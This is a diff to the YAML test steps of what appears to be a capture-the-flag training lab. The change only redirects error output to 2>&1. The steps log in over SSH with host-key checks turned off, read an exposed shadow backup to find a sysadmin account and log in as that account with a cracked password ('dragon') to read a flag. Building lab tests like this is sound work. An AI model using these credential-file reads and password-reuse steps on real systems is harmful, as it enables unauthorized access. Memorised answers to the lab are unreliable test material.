@@ -79,22 +79,22 @@ topology:
 test:
   steps:
     - name: "SSH as technician"
-      command: "sshpass -p '{cred.technician.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.technician.user}@{target.target} 'whoami' 2>/dev/null"
+      command: "sshpass -p '{cred.technician.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.technician.user}@{target.target} 'whoami' 2>&1"
       expect: "technician"
       timeout: 15
 
     - name: "Discover exposed shadow backup"
-      command: "sshpass -p '{cred.technician.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.technician.user}@{target.target} 'cat /opt/ironforge/backups/shadow.bak | grep sysadmin | cut -d: -f1' 2>/dev/null"
+      command: "sshpass -p '{cred.technician.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.technician.user}@{target.target} 'cat /opt/ironforge/backups/shadow.bak | grep sysadmin | cut -d: -f1' 2>&1"
       expect: "sysadmin"
       timeout: 15
 
     - name: "Find token 1 in backup directory"
-      command: "sshpass -p '{cred.technician.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.technician.user}@{target.target} 'cat /opt/ironforge/backups/assessment_token.txt' 2>/dev/null"
+      command: "sshpass -p '{cred.technician.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.technician.user}@{target.target} 'cat /opt/ironforge/backups/assessment_token.txt' 2>&1"
       expect: "cr4ck3d"
       timeout: 15
 
     - name: "Switch to sysadmin with cracked password and read flag"
-      command: "sshpass -p 'dragon' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@{target.target} 'cat /home/sysadmin/flag.txt' 2>/dev/null"
+      command: "sshpass -p 'dragon' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@{target.target} 'cat /home/sysadmin/flag.txt' 2>&1"
       expect: "h4sh3s"
       timeout: 15
 
